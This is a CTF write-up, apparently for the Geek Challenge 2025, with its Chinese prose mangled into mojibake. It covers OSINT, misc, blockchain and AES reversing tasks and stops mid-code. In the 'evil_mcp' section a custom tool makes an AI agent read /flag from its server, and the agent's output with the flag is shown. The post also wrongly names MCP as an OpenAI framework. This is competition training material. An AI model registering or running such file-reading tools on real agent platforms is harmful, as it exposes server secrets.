èƒ½æ‰¾åˆ°ä»–ç°åœ¨åœ¨å“ªé‡Œå—<br>flagä¸ºSYC{åŸå¸‚_æ™¯ç‚¹åç§°}<br>ç¤ºä¾‹ï¼šSYC{æˆéƒ½å¸‚_æ­¦ä¾¯ç¥ }</p></blockquote><p>ç™¾åº¦è¯†å›¾ï¼Œå®¹æ˜“å®šä½åˆ°ç›¸ä¼¼åœºæ™¯ï¼š</p><p><code>SYC&#123;åŒ—äº¬å¸‚_å¤©å›å…¬å›­&#125;</code></p><p>â€‹</p><h3 id="evil-mcp"><a href="#evil-mcp" class="headerlink" title="evil_mcp"></a>evil_mcp</h3><blockquote><p>mcpæ˜¯å•¥ï¼Ÿå’Œaiè¿˜æœ‰å…³ç³»å—ï¼Œçœ‹ä¸€çœ‹</p></blockquote><p>MCP = Model Context Protocolï¼Œæ˜¯ OpenAI çš„æ–°æ¡†æ¶ï¼Œç”¨äºåœ¨æ¨¡å‹ä¸Šä¸‹æ–‡ä¸­åŠ¨æ€åŠ è½½â€œå·¥å…·ï¼ˆToolsï¼‰â€ã€‚</p><p>åœ¨è¿™ä¸ª CTF ç¯å¢ƒä¸­ï¼ŒAI å¯¹è¯å·¦ä¾§å°±æ˜¯ä¸€ä¸ª MCP Agentï¼Œå³ä¾§çš„â€œå·¥å…·â€åŒºæ˜¯ä½ èƒ½æ³¨å†Œçš„ Python å·¥å…·ã€‚</p><p>æ–°å»ºå·¥å…·å¹¶å°è¯•è¯»å–æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@tool(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    name=<span class="string">&quot;evil_reader&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    description=<span class="string">&quot;å°è¯•è¯»å–æœåŠ¡å™¨æ–‡ä»¶&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    input_schema=&#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;properties&quot;</span>: &#123;</span></span></span><br><span class="line"><span class="params"><span class="meta">            <span class="string">&quot;path&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>, <span class="string">&quot;description&quot;</span>: <span class="string">&quot;/flag&quot;</span>&#125;</span></span></span><br><span class="line"><span class="params"><span class="meta">        &#125;,</span></span></span><br><span class="line"><span class="params"><span class="meta">        <span class="string">&quot;required&quot;</span>: [<span class="string">&quot;path&quot;</span>]</span></span></span><br><span class="line"><span class="params"><span class="meta">    &#125;</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">evil_reader</span>(<span class="params">arguments: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>], context: ToolExecutionContext</span>) -&gt; ToolResult:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(arguments[<span class="string">&quot;path&quot;</span>], <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        <span class="keyword">return</span> ToolResult(content=data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> ToolResult(content=<span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">tool = evil_reader</span><br></pre></td></tr></table></figure><p>ä¿å­˜å·¥å…·ï¼Œç„¶åå¯¹è¯æ¡†å‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil_reader</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;content&quot;: &quot;SYC&#123;019a190587e77d26b51a1e7b914049e0&#125;\n&quot;, &quot;metadata&quot;: &#123;&#125;&#125;</span><br><span class="line"></span><br><span class="line">æ‚¨æˆåŠŸè¯»å–äº† `/flag` æ–‡ä»¶å†…å®¹ï¼Œå…¶ä¸­åŒ…å«çš„ flag ä¸ºï¼š  </span><br><span class="line">**SYC&#123;019a190587e77d26b51a1e7b914049e0&#125;**</span><br><span class="line"></span><br><span class="line">è¿™é€šå¸¸æ˜¯ä¸€ä¸ª CTFï¼ˆå¤ºæ——èµ›ï¼‰æˆ–å®‰å…¨ç»ƒä¹ ä¸­çš„ flag æ ¼å¼ã€‚å¦‚æœæ‚¨éœ€è¦è¿›ä¸€æ­¥åˆ†ææˆ–éªŒè¯è¯¥ flag çš„æœ‰æ•ˆæ€§ï¼Œè¯·å‘ŠçŸ¥å…·ä½“éœ€æ±‚ï¼  </span><br><span class="line">ï¼ˆæ³¨æ„ï¼šåœ¨çœŸå®ç¯å¢ƒä¸­ï¼Œæœªç»æˆæƒè¯»å–æ­¤ç±»æ–‡ä»¶å¯èƒ½æ¶‰åŠå®‰å…¨é£é™©ï¼Œè¯·ç¡®ä¿æ“ä½œç¬¦åˆåˆæ³•åˆè§„è¦æ±‚ã€‚ï¼‰</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Bite-off-picture"><a href="#Bite-off-picture" class="headerlink" title="Bite off picture"></a>Bite off picture</h3><blockquote><p>åªæœ‰æˆ‘åšmiscçš„ç¬¬ä¸€æ­¥æ˜¯æ‰“å¼€010å—</p></blockquote><p>010editoræŸ¥çœ‹zipæœ«å°¾ï¼š<code>==gcyV2dyV2d</code>ï¼Œåè½¬base64è§£ç ï¼š<code>werwerr</code>ã€‚</p><p>è§£å‹åä¿®æ”¹pngå›¾ç‰‡é«˜åº¦å¾—flagï¼š</p><p><code>SYC&#123;mi3c_13_really_fun!!!!!&#125;</code></p><p>â€‹</p><h3 id="1Z-Sign"><a href="#1Z-Sign" class="headerlink" title="1Z_Sign"></a>1Z_Sign</h3><blockquote><p>ä¸»ç½‘è¿™ç¬”äº¤æ˜“äº¤äº’æ± å­çš„è´¹ç‡0x1d3040872d9c3d15d47323996926c2aa5c7b636fc7209f701301878dcf438598</p></blockquote><p>åœ¨ Etherscan æŸ¥æ‰¾è¯¥äº¤æ˜“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://etherscan.io/tx/0x1d3040872d9c3d15d47323996926c2aa5c7b636fc7209f701301878dcf438598</span><br></pre></td></tr></table></figure><p>æ‰¾ Logs éƒ¨åˆ†ï¼ŒæŸ¥çœ‹æ—¥å¿—æ•°æ®é‡Œçš„ fee å­—æ®µï¼š</p><p><img src="/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251029113524718.png" alt="image-20251029113524718"></p><p>å¯¹åº” Uniswap V3 feeTier â†” ç™¾åˆ†æ¯” æ˜ å°„ï¼Œfee å­—æ®µæ˜¯ 9900ï¼Œflagå°±æ˜¯ï¼š</p><p><code>SYC&#123;0.99%&#125;</code></p><p>â€‹</p><h3 id="Blockchain-SignIn"><a href="#Blockchain-SignIn" class="headerlink" title="Blockchain SignIn"></a>Blockchain SignIn</h3><blockquote><p>å¥‡æ€ªçš„äº¤æ˜“(sepolia testnet)ï¼š0x208e0465ea757073d0ec6af9094e5404ef81a213970eb580fa6a28a3af4669d6</p></blockquote><p>æŸ¥æ‰¾ sepolia etherscanï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sepolia.etherscan.io/tx/0x208e0465ea757073d0ec6af9094e5404ef81a213970eb580fa6a28a3af4669d6</span><br></pre></td></tr></table></figure><p>åœ¨ Input Dataé‡Œæ‰¾åˆ°flagï¼š</p><p><img src="/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251029113719264.png" alt="image-20251029113719264"></p><p><code>SYC&#123;w3b3_g4m3_st4rt&#125;</code></p><p>â€‹</p><h3 id="Dream"><a href="#Dream" class="headerlink" title="Dream"></a>Dream</h3><blockquote><p>å°æ˜æ˜¨æ™šæ¢¦è§ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„sepoliaåœ°å€0xd8B361E50174c4Ae99E31dCdF10B353C961f9C43ï¼Œäºæ˜¯ä»–å†³å®šå»çœ‹çœ‹ã€‚</p></blockquote><p>æŸ¥æ‰¾ sepolia etherscanï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://sepolia.etherscan.io/address/0xd8B361E50174c4Ae99E31dCdF10B353C961f9C43</span><br><span class="line">https://sepolia.etherscan.io/tx/0x73b9501b80b56abba14d032481f5dd1377fa1e97e4e1bd0f90a0cb0e346f18dc</span><br></pre></td></tr></table></figure><p>æœ‰æ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x6080604052348015600e575f80fd5b5060c980601a5f395ff3fe6080604052348015600e575f80fd5b50600436106026575f3560e01c8063cf9a197d14602a575b5f80fd5b60306044565b604051603b9190607c565b60405180910390f35b5f775359437b77336c63306d337430626c30636b636861316e7d805f5260205ff35b5f819050919050565b6076816066565b82525050565b5f602082019050608d5f830184606f565b9291505056fea2646970667358221220974b3f216c3631b694b1fb0452f8c8c6ab797a24697c62ebd80b250622b805e864736f6c63430008190033</span><br></pre></td></tr></table></figure><p><code>SYC&#123;w3lc0m3t0bl0ckcha1n&#125;</code></p><p>â€‹</p><h3 id="Points"><a href="#Points" class="headerlink" title="Points"></a>Points</h3><blockquote><p>å°æ˜çœ‹å®Œçªç„¶æƒ³èµ·13å·æŒ‚çš„ç§‘ç›®ä¸‹åˆ13ç‚¹å°±è¦è¡¥è€ƒäº†ï¼Œäºæ˜¯è¯·ä½ å¸®ä»–è¡¥è€ƒå¹¶ç»™å‡º13ä¸ªæ¯”ç‰¹å¸çš„æŠ¥ä»·ã€‚ä½ èƒ½æ‹¿æ»¡åˆ†å—ï¼Ÿ</p><p>hint: æµ‹è¯•å¸è·å–ï¼š<a target="_blank" rel="noopener" href="https://sepolia-faucet.pk910.de/">https://sepolia-faucet.pk910.de/</a></p></blockquote><p>éé¢„æœŸã€‚</p><p>å»0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C ç•Œé¢ï¼š<br><a target="_blank" rel="noopener" href="https://sepolia.etherscan.io/address/0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C">https://sepolia.etherscan.io/address/0x877e0B8fB7090C5e60eE5f605f8b67281aD4036C</a></p><p>æ‰¾ä¸€ä¸ªäº¤æ˜“ï¼š<br><a target="_blank" rel="noopener" href="https://sepolia.etherscan.io/tx/0xc0a8f04c3f98ae58766610f95cf99095986f87c84b0f2ac68244de223d15d8a8">https://sepolia.etherscan.io/tx/0xc0a8f04c3f98ae58766610f95cf99095986f87c84b0f2ac68244de223d15d8a8</a></p><p>å–æ¥æºçš„åˆçº¦åœ°å€ï¼š0x7252CA3Ae2C13AB09AE0650a94c281BfbE22e959</p><p>æäº¤å¾—åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://019a3fa9-0bfb-794b-afc3-aba0381ec1e1.geek.ctfplus.cn/check/0x7252CA3Ae2C13AB09AE0650a94c281BfbE22e959?condition=0x7252CA3Ae2C13AB09AE0650a94c281BfbE22e959</span><br></pre></td></tr></table></figure><p><code>SYC&#123;You_gOt_A1l_P0ints!&#125;</code></p><p>â€‹</p><h3 id="Mission-Ghost-Signal"><a href="#Mission-Ghost-Signal" class="headerlink" title="Mission Ghost Signal"></a>Mission Ghost Signal</h3><blockquote><p>ç‰¹å·¥ï¼Œæˆ‘ä»¬åœ¨å¯¹Eternal SummerèŠ‚ç‚¹çš„å¸¸è§„è°ƒæŸ¥ä¸­æ‰¾åˆ°äº†ä¸€äº›å¼‚å¸¸ã€‚<br>ä¸€ä¸ªä»æœªè¢«å‘ç°çš„èŠ‚ç‚¹é¢‘æ®µï¼Œé‡å¤å¹¿æ’­ç€å¥‡æ€ªçš„æ•°æ®æµã€‚æˆ‘ä»¬å°è¯•å¯¹è¿™ä¸ªæ•°æ®æµè¿›è¡Œè¿½æº¯å¤åŸï¼Œå¾—åˆ°äº†åŠ å¯†çš„å½’æ¡£ã€‚æ–‡ä»¶æ‰€ä½¿ç”¨çš„å‹ç¼©æ–¹å¼ååˆ†å¤è€ï¼Œç°åœ¨ç”±ä½ å»è°ƒæŸ¥ï¼Œå‘æ˜ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p></blockquote><p>AES-CBCç®—æ³•ï¼Œå‘ç°ä¸æ˜¯æ ‡å‡†å‚æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = b&quot;Syclover2025Geek&quot;</span><br><span class="line">iv = b&quot;1145141145144332&quot;</span><br></pre></td></tr></table></figure><p>åŠ¨è°ƒæ¯”å¯¹ï¼Œå‘ç°Sç›’å˜åŒ–ï¼ŒåŠ¨è°ƒå–å‡ºSç›’ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ==========================================================</span></span><br><span class="line"><span class="comment"># çº¯ Python AES-CBC åŠ è§£å¯†å®ç°ï¼ˆæ— ä»»ä½•å¤–éƒ¨åº“ï¼‰</span></span><br><span class="line"><span class="comment"># æ”¯æŒ AES-128/192/256ï¼Œæ ‡å‡† PKCS#7 å¡«å……</span></span><br><span class="line"><span class="comment"># ==========================================================</span></span><br><span class="line"></span><br><span class="line">wx = [<span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0x63</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, </span><br><span class="line">  <span class="number">0x32</span>, <span class="number">0x35</span>, <span class="number">0x47</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x6B</span>, <span class="number">0x60</span>, <span class="number">0x4B</span>, <span class="number">0xB4</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0x3D</span>, <span class="number">0xD1</span>, <span class="number">0x74</span>, <span class="number">0x3D</span>, <span class="number">0x0D</span>, <span class="number">0xE3</span>, <span class="number">0x41</span>, <span class="number">0x7A</span>, <span class="number">0x68</span>, </span><br><span class="line">  <span class="number">0x86</span>, <span class="number">0x2A</span>, <span class="number">0xB1</span>, <span class="number">0x96</span>, <span class="number">0x44</span>, <span class="number">0x84</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0x95</span>, <span class="number">0xF0</span>, </span><br><span class="line">  <span class="number">0x83</span>, <span class="number">0xA6</span>, <span class="number">0x76</span>, <span class="number">0xB1</span>, <span class="number">0xF9</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0x9B</span>, <span class="number">0x3C</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x9C</span>, <span class="number">0x85</span>, <span class="number">0x82</span>, <span class="number">0xA3</span>, <span class="number">0x09</span>, <span class="number">0x75</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x7F</span>, <span class="number">0xC4</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xCB</span>, <span class="number">0x8F</span>, <span class="number">0x5F</span>, <span class="number">0x62</span>, <span class="number">0x46</span>, <span class="number">0x81</span>, <span class="number">0x2E</span>, <span class="number">0xE0</span>, <span class="number">0xE5</span>, </span><br><span class="line">  <span class="number">0x88</span>, <span class="number">0x5B</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0xF7</span>, <span class="number">0x9F</span>, <span class="number">0x19</span>, <span class="number">0x2B</span>, <span class="number">0x78</span>, <span class="number">0xC0</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x5C</span>, <span class="number">0x82</span>, <span class="number">0x54</span>, <span class="number">0xF3</span>, <span class="number">0xB9</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x12</span>, <span class="number">0x59</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span class="number">0x90</span>, <span class="number">0x0B</span>, <span class="number">0x72</span>, <span class="number">0x85</span>, <span class="number">0x50</span>, <span class="number">0x96</span>, <span class="number">0xA5</span>, <span class="number">0xA1</span>, <span class="number">0xFE</span>, </span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x1C</span>, <span class="number">0xAB</span>, <span class="number">0xF1</span>, <span class="number">0x77</span>, <span class="number">0x45</span>, <span class="number">0x56</span>, <span class="number">0x61</span>, <span class="number">0x7C</span>, <span class="number">0x37</span>, </span><br><span class="line">  <span class="number">0xD3</span>, <span class="number">0x31</span>, <span class="number">0xB8</span>, <span class="number">0x74</span>, <span class="number">0x5D</span>, <span class="number">0x5E</span>, <span class="number">0xDD</span>, <span class="number">0x68</span>, <span class="number">0xF6</span>, <span class="number">0xAF</span>, </span><br><span class="line">  <span class="number">0xAA</span>, <span class="number">0x2D</span>, <span class="number">0xA0</span>, <span class="number">0xCE</span>, <span class="number">0xD6</span>, <span class="number">0x1A</span>, <span class="number">0x73</span>, <span class="number">0xFF</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0xEE</span>, <span class="number">0xED</span>, <span class="number">0x12</span>, <span class="number">0x87</span>, <span class="number">0x44</span>, <span class="number">0xC0</span>, <span class="number">0xB2</span>, <span class="number">0x49</span>, </span><br><span class="line">  <span class="number">0x92</span>, <span class="number">0xDA</span>, <span class="number">0xC1</span>, <span class="number">0xB6</span>, <span class="number">0x73</span>, <span class="number">0x45</span>, <span class="number">0xB9</span>, <span class="number">0x7B</span>, <span class="number">0x9D</span>, <span class="number">0xA8</span>, </span><br><span class="line">  <span class="number">0xAB</span>, <span class="number">0xFC</span>, <span class="number">0xD9</span>, <span class="number">0x68</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4B</span>, <span class="number">0xB2</span>, <span class="number">0xD8</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0x83</span>, <span class="number">0x16</span>, <span class="number">0x97</span>, <span class="number">0x02</span>, <span class="number">0x2B</span>, <span class="number">0xBD</span>, <span class="number">0x6B</span>, <span class="number">0xDB</span>, <span class="number">0x43</span>, </span><br><span class="line">  <span class="number">0xA4</span>, <span class="number">0xDE</span>, <span class="number">0x90</span>, <span class="number">0xF1</span>, <span class="number">0x7C</span>, <span class="number">0xDD</span>]</span><br><span class="line">w = [wx[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"><span class="comment"># AES S-box ä¸é€† S-box</span></span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s_box = [</span></span><br><span class="line"><span class="string">    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,</span></span><br><span class="line"><span class="string">    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,</span></span><br><span class="line"><span class="string">    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,</span></span><br><span class="line"><span class="string">    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,</span></span><br><span class="line"><span class="string">    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,</span></span><br><span class="line"><span class="string">    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,</span></span><br><span class="line"><span class="string">    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,</span></span><br><span class="line"><span class="string">    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,</span></span><br><span class="line"><span class="string">    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,</span></span><br><span class="line"><span class="string">    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,</span></span><br><span class="line"><span class="string">    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,</span></span><br><span class="line"><span class="string">    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,</span></span><br><span class="line"><span class="string">    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,</span></span><br><span class="line"><span class="string">    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,</span></span><br><span class="line"><span class="string">    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,</span></span><br><span class="line"><span class="string">    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s_box = [<span class="number">0xA7</span>, <span class="number">0xB8</span>, <span class="number">0x36</span>, <span class="number">0xAF</span>, <span 